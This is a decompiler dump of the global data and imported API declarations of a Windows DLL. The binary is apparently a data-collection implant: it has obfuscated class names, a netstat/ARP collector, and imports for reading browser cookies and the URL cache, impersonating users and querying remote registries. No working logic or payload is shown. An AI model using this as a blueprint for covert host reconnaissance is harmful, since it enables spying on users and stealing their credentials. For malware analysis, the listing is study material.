// extern BOOL (__stdcall *SystemTimeToFileTime)(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern LPSTR (__stdcall *lstrcpynA)(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern DWORD (__stdcall *GetFileAttributesA)(LPCSTR lpFileName);
// extern int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *ExpandEnvironmentStringsA)(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize);
// extern DWORD (__stdcall *GetLastError)();
// extern UINT (__stdcall *GetWindowsDirectoryA)(LPSTR lpBuffer, UINT uSize);
// extern BOOL (__stdcall *TerminateThread)(HANDLE hThread, DWORD dwExitCode);
// extern BOOL (__stdcall *GetExitCodeThread)(HANDLE hThread, LPDWORD lpExitCode);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern UINT (__stdcall *GetDriveTypeA)(LPCSTR lpRootPathName);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern LPWSTR (__stdcall *lstrcpynW)(LPWSTR lpString1, LPCWSTR lpString2, int iMaxLength);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern BOOL (__stdcall *FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// extern int (__stdcall *lstrcmpA)(LPCSTR lpString1, LPCSTR lpString2);
// extern HANDLE (__stdcall *FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern UINT (__stdcall *GetSystemDirectoryA)(LPSTR lpBuffer, UINT uSize);
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern void (__stdcall *GetLocalTime)(LPSYSTEMTIME lpSystemTime);
// extern DWORD (__stdcall *GetTickCount)();
// extern BOOL (__stdcall *GetVolumeInformationA)(LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
// extern DWORD (__stdcall *GetLogicalDriveStringsA)(DWORD nBufferLength, LPSTR lpBuffer);
// extern DWORD (__stdcall *GetVersion)();
// extern BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern HANDLE (__stdcall *GetCurrentThread)();
// extern void (__stdcall *RaiseException)(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern void (__stdcall *GetSystemTime)(LPSYSTEMTIME lpSystemTime);
// extern BOOL (__stdcall *GetVolumeNameForVolumeMountPointA)(LPCSTR lpszVolumeMountPoint, LPSTR lpszVolumeName, DWORD cchBufferLength);
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern BOOL (__stdcall *ProcessIdToSessionId)(DWORD dwProcessId, DWORD *pSessionId);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern LPVOID (__stdcall *HeapReAlloc)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern LONG (__stdcall *InterlockedExchange)(volatile LONG *Target, LONG Value);
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
_UNKNOWN unk_1001B28B; // weak
_UNKNOWN unk_1001B28C; // weak
_UNKNOWN unk_1001B29D; // weak
_UNKNOWN unk_1001B29E; // weak
_UNKNOWN unk_1001B29F; // weak
_UNKNOWN unk_1001B2A0; // weak
_UNKNOWN unk_1001B2A1; // weak
_UNKNOWN unk_1001B2A2; // weak
_UNKNOWN unk_1001B2A3; // weak
_UNKNOWN unk_1001B2A4; // weak
_UNKNOWN unk_1001B2A5; // weak
void *MjsYbbJrrfdy::`vftable' = &unknown_libname_1; // weak
void *FjooPyswdq::`vftable' = &unknown_libname_1; // weak
void *sr::Snsziibtx::`vftable' = &sub_100017BE; // weak
void *sr::GfnpwoMadjdwvkl::`vftable' = &sub_100017E5; // weak
void *sr::HfpmmmiamaHpnxxaqhf::`vftable' = &sub_10001A1A; // weak
void *mm::data::List<BVzrxdlmeb *>::`vftable' = &sub_10001EF9; // weak
void *mm::data::List<FZwxyjh *>::`vftable' = &sub_10001F20; // weak
void *sr::TyxCkOnhqdgZuatyxcko::`vftable' = &sub_10001F3C; // weak
void *Jclfvc::`vftable' = &sub_1000228F; // weak
_UNKNOWN unk_1001B3A4; // weak
_UNKNOWN unk_1001B3C8; // weak
_UNKNOWN unk_1001B3F8; // weak
_UNKNOWN unk_1001B41C; // weak
_UNKNOWN unk_1001B45C; // weak
_UNKNOWN unk_1001B480; // weak
_UNKNOWN unk_1001B4B0; // weak
_UNKNOWN unk_1001B4D4; // weak
_UNKNOWN unk_1001B4F8; // weak
_UNKNOWN unk_1001B4FC; // weak
_UNKNOWN unk_1001B524; // weak
_UNKNOWN unk_1001B548; // weak
_UNKNOWN unk_1001B570; // weak
_UNKNOWN unk_1001B5BC; // weak
_UNKNOWN unk_1001B5E8; // weak
void *BVzrxdlmeb::`vftable' = &unknown_libname_2; // weak
void *EnvcjlRxleLhdyndhoa::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001B668; // weak
_UNKNOWN unk_1001B6CC; // weak
_UNKNOWN unk_1001B6F0; // weak
_UNKNOWN unk_1001B71C; // weak
_UNKNOWN unk_1001B758; // weak
_UNKNOWN unk_1001B77C; // weak
_UNKNOWN unk_1001B7AC; // weak
_UNKNOWN unk_1001B7D0; // weak
_UNKNOWN unk_1001B808; // weak
_UNKNOWN unk_1001B82C; // weak
_UNKNOWN unk_1001B868; // weak
_UNKNOWN unk_1001B8AC; // weak
_UNKNOWN unk_1001B8D4; // weak
void *WgKywecmAkzvnhnww::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001B920; // weak
_UNKNOWN unk_1001B921; // weak
_UNKNOWN unk_1001B922; // weak
_UNKNOWN unk_1001B923; // weak
_UNKNOWN unk_1001B924; // weak
_UNKNOWN unk_1001B925; // weak
_UNKNOWN unk_1001B926; // weak
_UNKNOWN unk_1001B927; // weak
_UNKNOWN unk_1001B928; // weak
_UNKNOWN unk_1001B929; // weak
void *QmghspgvhiXpvfsi::`vftable' = &sub_10003308; // weak
void *mm::data::List<void *>::`vftable' = &sub_100031B7; // weak
void *mm::data::List<UMwkodr *>::`vftable' = &sub_100031D3; // weak
void *TsjcbmKhqytf::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001BA18; // weak
_UNKNOWN unk_1001BA40; // weak
_UNKNOWN unk_1001BAB0; // weak
_UNKNOWN unk_1001BAD0; // weak
void *HodbmxrbZwanMespyfaho::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001BB24; // weak
void *HhawtcrrygmjaYsismvZwhhawtcr::`vftable' = &sub_100017BE; // weak
void *Njowlwxhnxti::`vftable' = &sub_10003743; // weak
void *VgasvinjIiyocpsrj::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001BB98; // weak
_UNKNOWN unk_1001BBD4; // weak
_UNKNOWN unk_1001BC00; // weak
_UNKNOWN unk_1001BC88; // weak
_UNKNOWN unk_1001BD10; // weak
void *gqpgNqsqyUppxokcqx::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001BDC4; // weak
_UNKNOWN unk_1001BDE0; // weak
_UNKNOWN unk_1001BE00; // weak
_UNKNOWN unk_1001BE20; // weak
void *JpenyjqcsLvbfbnaJpenyjqcs::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001BE70; // weak
_UNKNOWN unk_1001BEA0; // weak
_UNKNOWN unk_1001BF04; // weak
_UNKNOWN unk_1001BF2C; // weak
_UNKNOWN unk_1001BF50; // weak
_UNKNOWN unk_1001BFA8; // weak
_UNKNOWN unk_1001BFC8; // weak
_UNKNOWN unk_1001BFF0; // weak
_UNKNOWN unk_1001C044; // weak
_UNKNOWN unk_1001C064; // weak
_UNKNOWN unk_1001C088; // weak
_UNKNOWN unk_1001C0EC; // weak
_UNKNOWN unk_1001C11C; // weak
_UNKNOWN unk_1001C140; // weak
_UNKNOWN unk_1001C1A4; // weak
_UNKNOWN unk_1001C1C8; // weak
_UNKNOWN unk_1001C1F0; // weak
_UNKNOWN unk_1001C248; // weak
_UNKNOWN unk_1001C26C; // weak
_UNKNOWN unk_1001C290; // weak
_UNKNOWN unk_1001C2EC; // weak
_UNKNOWN unk_1001C308; // weak
_UNKNOWN unk_1001C328; // weak
_UNKNOWN unk_1001C374; // weak
_UNKNOWN unk_1001C394; // weak
_UNKNOWN unk_1001C3B8; // weak
_UNKNOWN unk_1001C40C; // weak
_UNKNOWN unk_1001C42C; // weak
_UNKNOWN unk_1001C448; // weak
_UNKNOWN unk_1001C480; // weak
_UNKNOWN unk_1001C4A4; // weak
_UNKNOWN unk_1001C4D0; // weak
_UNKNOWN unk_1001C514; // weak
_UNKNOWN unk_1001C53C; // weak
_UNKNOWN unk_1001C55C; // weak
_UNKNOWN unk_1001C58C; // weak
_UNKNOWN unk_1001C5B0; // weak
_UNKNOWN unk_1001C5D8; // weak
_UNKNOWN unk_1001C628; // weak
_UNKNOWN unk_1001C648; // weak
_UNKNOWN unk_1001C664; // weak
_UNKNOWN unk_1001C694; // weak
_UNKNOWN unk_1001C6CC; // weak
_UNKNOWN unk_1001C6F0; // weak
_UNKNOWN unk_1001C740; // weak
_UNKNOWN unk_1001C768; // weak
_UNKNOWN unk_1001C79C; // weak
_UNKNOWN unk_1001C7B8; // weak
_UNKNOWN unk_1001C7D4; // weak
_UNKNOWN unk_1001C7EC; // weak
_UNKNOWN unk_1001C820; // weak
_UNKNOWN unk_1001C83C; // weak
_UNKNOWN unk_1001C860; // weak
_UNKNOWN unk_1001C8AC; // weak
_UNKNOWN unk_1001C8D0; // weak
_UNKNOWN unk_1001C904; // weak
_UNKNOWN unk_1001C924; // weak
_UNKNOWN unk_1001C940; // weak
_UNKNOWN unk_1001C960; // weak
_UNKNOWN unk_1001C980; // weak
_UNKNOWN unk_1001C9A0; // weak
_UNKNOWN unk_1001C9C0; // weak
_UNKNOWN unk_1001C9F8; // weak
_UNKNOWN unk_1001CA24; // weak
_UNKNOWN unk_1001CA44; // weak
_UNKNOWN unk_1001CA60; // weak
_UNKNOWN unk_1001CA80; // weak
_UNKNOWN unk_1001CAA0; // weak
_UNKNOWN unk_1001CAC0; // weak
_UNKNOWN unk_1001CAE0; // weak
_UNKNOWN unk_1001CB00; // weak
_UNKNOWN unk_1001CB34; // weak
_UNKNOWN unk_1001CB50; // weak
_UNKNOWN unk_1001CB84; // weak
_UNKNOWN unk_1001CBA8; // weak
_UNKNOWN unk_1001CBF4; // weak
_UNKNOWN unk_1001CC10; // weak
_UNKNOWN unk_1001CC30; // weak
_UNKNOWN unk_1001CC50; // weak
_UNKNOWN unk_1001CC70; // weak
_UNKNOWN unk_1001CCB0; // weak
_UNKNOWN unk_1001CCD0; // weak
_UNKNOWN unk_1001CCF0; // weak
_UNKNOWN unk_1001CD10; // weak
_UNKNOWN unk_1001CD3C; // weak
_UNKNOWN unk_1001CD5C; // weak
_UNKNOWN unk_1001CD84; // weak
_UNKNOWN unk_1001CDA4; // weak
_UNKNOWN unk_1001CDE0; // weak
void *MdtrbrZtbtnzmuf::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001CE5C; // weak
_UNKNOWN unk_1001CE84; // weak
_UNKNOWN unk_1001CEAC; // weak
void *RyxshrOsoycfqth::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001CEE4; // weak
CHAR aKernel32Dll_0[] = "kernel32.dll"; // idb
char asc_1001CF1C[] = ":\\"; // idb
void *EmkmfyWqwcnpWsxpczgae::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001CF54; // weak
_UNKNOWN unk_1001CF6C; // weak
_UNKNOWN unk_1001CF90; // weak
_UNKNOWN unk_1001CFB4; // weak
_UNKNOWN unk_1001CFCC; // weak
_UNKNOWN unk_1001CFF0; // weak
_UNKNOWN unk_1001D018; // weak
_UNKNOWN unk_1001D048; // weak
_UNKNOWN unk_1001D06C; // weak
_UNKNOWN unk_1001D090; // weak
_UNKNOWN unk_1001D0BC; // weak
_UNKNOWN unk_1001D0E8; // weak
_UNKNOWN unk_1001D108; // weak
CHAR String2[2] = "*"; // idb
CHAR asc_1001D138[2] = "."; // idb
CHAR asc_1001D13C[3] = ".."; // idb
_UNKNOWN unk_1001D140; // weak
_UNKNOWN unk_1001D1A8; // weak
_UNKNOWN unk_1001D1E0; // weak
_UNKNOWN unk_1001D218; // weak
_UNKNOWN unk_1001D23C; // weak
_UNKNOWN unk_1001D258; // weak
_UNKNOWN unk_1001D278; // weak
_UNKNOWN unk_1001D298; // weak
CHAR asc_1001D2BC[2] = "\\"; // idb
_UNKNOWN unk_1001D2C0; // weak
_UNKNOWN unk_1001D310; // weak
_UNKNOWN unk_1001D35C; // weak
_UNKNOWN unk_1001D384; // weak
_UNKNOWN unk_1001D3A4; // weak
_UNKNOWN unk_1001D3C4; // weak
_UNKNOWN unk_1001D3E4; // weak
void *TvtcxlnTfxYjbzSiwtVtcxlntfx::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001D424; // weak
_UNKNOWN unk_1001D444; // weak
_UNKNOWN unk_1001D464; // weak
_UNKNOWN unk_1001D484; // weak
void *ItfVvnfaqnlf::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001D4CC; // weak
_UNKNOWN unk_1001D4EC; // weak
_UNKNOWN unk_1001D510; // weak
_UNKNOWN unk_1001D530; // weak
_UNKNOWN unk_1001D548; // weak
_UNKNOWN unk_1001D56C; // weak
_UNKNOWN unk_1001D590; // weak
_UNKNOWN unk_1001D5B0; // weak
_UNKNOWN unk_1001D5D0; // weak
_UNKNOWN unk_1001D5F8; // weak
void *YwmNvemlQyjbrqevj::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001D640; // weak
_UNKNOWN unk_1001D668; // weak
_UNKNOWN unk_1001D6B8; // weak
_UNKNOWN unk_1001D6D8; // weak
_UNKNOWN unk_1001D71C; // weak
void *VsytBnvmghTcwrpuvav::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001D774; // weak
_UNKNOWN unk_1001D798; // weak
_UNKNOWN unk_1001D7C0; // weak
_UNKNOWN unk_1001D7E4; // weak
_UNKNOWN unk_1001D808; // weak
_UNKNOWN unk_1001D838; // weak
_UNKNOWN unk_1001D858; // weak
_UNKNOWN unk_1001D87C; // weak
_UNKNOWN unk_1001D8A0; // weak
_UNKNOWN unk_1001D8C4; // weak
_UNKNOWN unk_1001D8E8; // weak
_UNKNOWN unk_1001D90C; // weak
_UNKNOWN unk_1001D930; // weak
_UNKNOWN unk_1001D948; // weak
_UNKNOWN unk_1001D9A0; // weak
_UNKNOWN unk_1001DA04; // weak
_UNKNOWN unk_1001DA24; // weak
_UNKNOWN unk_1001DA44; // weak
_UNKNOWN unk_1001DA68; // weak
_UNKNOWN unk_1001DA88; // weak
_UNKNOWN unk_1001DAB0; // weak
_UNKNOWN unk_1001DAD4; // weak
_UNKNOWN unk_1001DAF8; // weak
_UNKNOWN unk_1001DB20; // weak
_UNKNOWN unk_1001DB40; // weak
_UNKNOWN unk_1001DB64; // weak
_UNKNOWN unk_1001DB88; // weak
_UNKNOWN unk_1001DBA8; // weak
_UNKNOWN unk_1001DBCC; // weak
_UNKNOWN unk_1001DBF0; // weak
_UNKNOWN unk_1001DC48; // weak
_UNKNOWN unk_1001DC70; // weak
_UNKNOWN unk_1001DCB4; // weak
_UNKNOWN unk_1001DCD4; // weak
_UNKNOWN unk_1001DCF8; // weak
_UNKNOWN unk_1001DD20; // weak
_UNKNOWN unk_1001DD44; // weak
_UNKNOWN unk_1001DD68; // weak
_UNKNOWN unk_1001DD90; // weak
_UNKNOWN unk_1001DDD4; // weak
_UNKNOWN unk_1001DDF4; // weak
_UNKNOWN unk_1001DE18; // weak
_UNKNOWN unk_1001DE38; // weak
_UNKNOWN unk_1001DE50; // weak
CHAR a0x[3] = "0x"; // idb
_UNKNOWN unk_1001DE70; // weak
_UNKNOWN unk_1001DED8; // weak
_UNKNOWN unk_1001DEF8; // weak
_UNKNOWN unk_1001DF1C; // weak
_UNKNOWN unk_1001DF38; // weak
_UNKNOWN unk_1001DF5C; // weak
_UNKNOWN unk_1001DF7C; // weak
_UNKNOWN unk_1001DF98; // weak
_UNKNOWN unk_1001DFB4; // weak
_UNKNOWN unk_1001DFD0; // weak
const wchar_t Source[] = L"\\"; // idb
void *GvbyqyaXvxcAzeulcnqg::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001E018; // weak
_UNKNOWN unk_1001E040; // weak
_UNKNOWN unk_1001E088; // weak
_UNKNOWN unk_1001E0A8; // weak
_UNKNOWN unk_1001E104; // weak
_UNKNOWN unk_1001E128; // weak
_UNKNOWN unk_1001E198; // weak
_UNKNOWN unk_1001E220; // weak
void *PFHVtanpynem::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001E288; // weak
_UNKNOWN unk_1001E2AC; // weak
_UNKNOWN unk_1001E2D0; // weak
_UNKNOWN unk_1001E2F8; // weak
CHAR asc_1001E324[2] = "*"; // idb
CHAR asc_1001E328[2] = "."; // idb
CHAR asc_1001E32C[3] = ".."; // idb
_UNKNOWN unk_1001E330; // weak
_UNKNOWN unk_1001E34C; // weak
_UNKNOWN unk_1001E388; // weak
_UNKNOWN unk_1001E3A4; // weak
_UNKNOWN unk_1001E3D0; // weak
_UNKNOWN unk_1001E414; // weak
_UNKNOWN unk_1001E444; // weak
_UNKNOWN unk_1001E45C; // weak
_UNKNOWN unk_1001E478; // weak
_UNKNOWN unk_1001E4C0; // weak
_UNKNOWN unk_1001E504; // weak
_UNKNOWN unk_1001E520; // weak
_UNKNOWN unk_1001E564; // weak
_UNKNOWN unk_1001E58C; // weak
CHAR asc_1001E5B4[2] = "."; // idb
CHAR asc_1001E5B8[3] = ".."; // idb
void *CsyLpscmkDwfxvacsy::`vftable' = &unknown_libname_2; // weak
_UNKNOWN unk_1001E5D4; // weak
_UNKNOWN unk_1001E5E9; // weak
_UNKNOWN unk_1001E5EA; // weak
_UNKNOWN unk_1001E5EB; // weak
_UNKNOWN unk_1001E5EC; // weak
_UNKNOWN unk_1001E60D; // weak
_UNKNOWN unk_1001E60E; // weak
_UNKNOWN unk_1001E60F; // weak
_UNKNOWN unk_1001E610; // weak
_UNKNOWN unk_1001E630; // weak
_UNKNOWN unk_1001E650; // weak
_UNKNOWN unk_1001E672; // weak
_UNKNOWN unk_1001E673; // weak
_UNKNOWN unk_1001E674; // weak
_UNKNOWN unk_1001E675; // weak
_UNKNOWN unk_1001E676; // weak
_UNKNOWN unk_1001E677; // weak
_UNKNOWN unk_1001E678; // weak
_UNKNOWN unk_1001E679; // weak
_UNKNOWN unk_1001E67A; // weak
void *mm::data::List<NetstatAndArpCollector::NETSTAT_RECORD>::`vftable' = &sub_1000A9E5; // weak
void *mm::data::List<bool>::`vftable' = &sub_1000AA01; // weak
void *mm::data::Map<NetstatAndArpCollector::NETSTAT_RECORD,bool>::`vftable' = &sub_1000AA1D; // weak
void *mm::data::Set<NetstatAndArpCollector::NETSTAT_RECORD>::`vftable' = &sub_1000AA39; // weak
void *mm::data::List<NetstatAndArpCollector::ARP_RECORD>::`vftable' = &sub_1000AA55; // weak
void *mm::data::Map<NetstatAndArpCollector::ARP_RECORD,bool>::`vftable' = &sub_1000AA71; // weak
void *mm::data::Set<NetstatAndArpCollector::ARP_RECORD>::`vftable' = &sub_1000AA8D; // weak
void *UmpwwllNooDilVraxtwump::`vftable' = &sub_1000B394; // weak
void *XmzzhvdvbmEKKCQxmzzhvdv::`vftable' = &unknown_libname_2; // weak
char byte_1001E828[] = { 'A' }; // weak
_UNKNOWN unk_1001E87C; // weak
_UNKNOWN unk_1001E8A0; // weak
_UNKNOWN unk_1001E8C8; // weak
_UNKNOWN unk_1001E8EC; // weak
_UNKNOWN unk_1001E914; // weak
_UNKNOWN unk_1001E938; // weak
_UNKNOWN unk_1001E960; // weak
_UNKNOWN unk_1001E984; // weak
_UNKNOWN unk_1001E9B4; // weak
_UNKNOWN unk_1001E9D8; // weak
_UNKNOWN unk_1001EA00; // weak
_UNKNOWN unk_1001EA1C; // weak
_UNKNOWN unk_1001EA38; // weak
_UNKNOWN unk_1001EA5C; // weak
_UNKNOWN unk_1001EA80; // weak
_UNKNOWN unk_1001EAB4; // weak
_UNKNOWN unk_1001EAE4; // weak
_UNKNOWN unk_1001EB10; // weak
_UNKNOWN unk_1001EB48; // weak
_UNKNOWN unk_1001EB70; // weak
_UNKNOWN unk_1001ED68; // weak
wchar_t aPerf[4] = L"PERF"; // weak
_UNKNOWN unk_1001ED7C; // weak
_UNKNOWN unk_1001ED9C; // weak
_UNKNOWN unk_1001EDC0; // weak
_UNKNOWN unk_1001EDF0; // weak
_UNKNOWN unk_1001EE14; // weak
_UNKNOWN unk_1001EE38; // weak
_UNKNOWN unk_1001EFA0; // weak
_UNKNOWN unk_1001EFC0; // weak
_UNKNOWN unk_1001EFF4; // weak
_UNKNOWN unk_1001F018; // weak
void *nxys_uwip::`vftable' = &sub_1000E067; // weak
void *ikc::izq_ezibc::`vftable' = &sub_1000E0F1; // weak
void *ikc::qlurhxmnb::`vftable' = &sub_10012D7D; // weak
void *ikc::rnp_nhgjjqmxr::`vftable' = &sub_10012DD0; // weak
CHAR aGetprocesswind[] = "GetProcessWindowStation"; // idb
CHAR aGetuserobjecti[] = "GetUserObjectInformationA"; // idb
CHAR aGetlastactivep[] = "GetLastActivePopup"; // idb
CHAR aGetactivewindo[] = "GetActiveWindow"; // idb
CHAR aMessageboxa[] = "MessageBoxA"; // idb
CHAR LibFileName[] = "USER32.DLL"; // idb
_DWORD dword_10020ABC[4] = { 1408590605, 298890943, -1610550636, -1946476855 }; // weak
_UNKNOWN unk_10021910; // weak
_ThrowInfo _TI2_AVGfnpwoMadjdwvkl_sr__ = { 0u, &sub_1000D6DD, NULL, &_CTA2_AVGfnpwoMadjdwvkl_sr__ }; // idb
_ThrowInfo _TI1_AVSnsziibtx_sr__ = { 0u, &sub_1000D6C8, NULL, &_CTA1_AVSnsziibtx_sr__ }; // idb
_ThrowInfo _TI2_AVHfpmmmiamaHpnxxaqhf_sr__ = { 0u, &sub_1000D6F6, NULL, &_CTA2_AVHfpmmmiamaHpnxxaqhf_sr__ }; // idb
_ThrowInfo _TI2_AVTyxCkOnhqdgZuatyxcko_sr__ = { 0u, &sub_1000D70F, NULL, &_CTA2_AVTyxCkOnhqdgZuatyxcko_sr__ }; // idb
_UNKNOWN unk_10021D20; // weak
_ThrowInfo _TI2_AVHhawtcrrygmjaYsismvZwhhawtcr__ = { 0u, &sub_1000353A, NULL, &_CTA2_AVHhawtcrrygmjaYsismvZwhhawtcr__ }; // idb
_ThrowInfo _TI1_AVCgqgEwvkptzgl__ = { 0u, NULL, NULL, &_CTA1_AVCgqgEwvkptzgl__ }; // idb
_UNKNOWN unk_10022508; // weak
_UNKNOWN unk_10022548; // weak
void *off_100241C0 = &unk_10024218; // weak
_UNKNOWN unk_100241DC; // weak
int dword_100241E0 = 0; // weak
int dword_100241E4 = 0; // weak
int dword_100241EC = 0; // weak
int dword_100241F0 = 0; // weak
int dword_100241F8 = 0; // weak
int dword_100241FC = 0; // weak
int dword_10024204 = 0; // weak
int dword_10024208 = 0; // weak
int dword_10024210 = 0; // weak
int dword_10024214 = 0; // weak
int dword_1002421C = 0; // weak
int dword_10024220 = 0; // weak
int dword_10024228 = 0; // weak
int dword_1002422C = 0; // weak
int dword_100247DC = 3; // weak
_UNKNOWN unk_100247E0; // weak
_UNKNOWN unk_10024808; // weak
_UNKNOWN unk_10024854; // weak
_UNKNOWN unk_10024878; // weak
_UNKNOWN unk_100248C0; // weak
_UNKNOWN unk_100248E4; // weak
_UNKNOWN unk_10024900; // weak
_UNKNOWN unk_10024948; // weak
_UNKNOWN unk_1002496C; // weak
_UNKNOWN unk_10024988; // weak
LPCSTR lpValueName = "Counter 009"; // idb
int dword_100249C0 = -1153374642; // weak
void *off_10024D78 = &unk_10038260; // weak
// extern BOOL (__stdcall *RevertToSelf)();
// extern LSTATUS (__stdcall *RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern BOOL (__stdcall *GetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
// extern LSTATUS (__stdcall *RegEnumKeyExA)(HKEY hKey, DWORD dwIndex, LPSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime);
// extern LSTATUS (__stdcall *RegEnumValueA)(HKEY hKey, DWORD dwIndex, LPSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegConnectRegistryA)(LPCSTR lpMachineName, HKEY hKey, PHKEY phkResult);
// extern BOOL (__stdcall *ImpersonateLoggedOnUser)(HANDLE hToken);
// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern BOOL (__stdcall *SHGetSpecialFolderPathA)(HWND hwnd, LPSTR pszPath, int csidl, BOOL fCreate);
// extern BOOL (__stdcall *StrToIntExA)(PCSTR pszString, STIF_FLAGS dwFlags, int *piRet);
// extern PSTR (__stdcall *StrChrA)(PCSTR pszStart, WORD wMatch);
// extern BOOL (__stdcall *PathIsUNCServerShareA)(LPCSTR pszPath);
// extern BOOL (__stdcall *PathRemoveFileSpecA)(LPSTR pszPath);
// extern LPSTR (__stdcall *PathAddBackslashA)(LPSTR pszPath);
// extern BOOL (__stdcall *PathAppendA)(LPSTR pszPath, LPCSTR pszMore);
// extern void (__stdcall *PathStripPathA)(LPSTR pszPath);
// extern int (*wsprintfA)(LPSTR, LPCSTR, ...);
// extern DWORD (__stdcall *CharLowerBuffA)(LPSTR lpsz, DWORD cchLength);
// extern BOOL (__stdcall *InternetGetCookieA)(LPCSTR lpszUrl, LPCSTR lpszCookieName, LPSTR lpszCookieData, LPDWORD lpdwSize);
// extern HANDLE (__stdcall *FindFirstUrlCacheEntryA)(LPCSTR lpszUrlSearchPattern, LPINTERNET_CACHE_ENTRY_INFOA lpFirstCacheEntryInfo, LPDWORD lpcbCacheEntryInfo);
// extern BOOL (__stdcall *FindNextUrlCacheEntryA)(HANDLE hEnumHandle, LPINTERNET_CACHE_ENTRY_INFOA lpNextCacheEntryInfo, LPDWORD lpcbCacheEntryInfo);
// extern BOOL (__stdcall *InternetCloseHandle)(HINTERNET hInternet);
// extern void (__stdcall *CoUninitialize)();
// extern HRESULT (__stdcall *CoInitialize)(LPVOID pvReserved);
// extern void (__stdcall *CoTaskMemFree)(LPVOID pv);
int dword_10025A80 = 0; // weak
int Val = 0; // idb
int dword_10025A88[15] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // weak
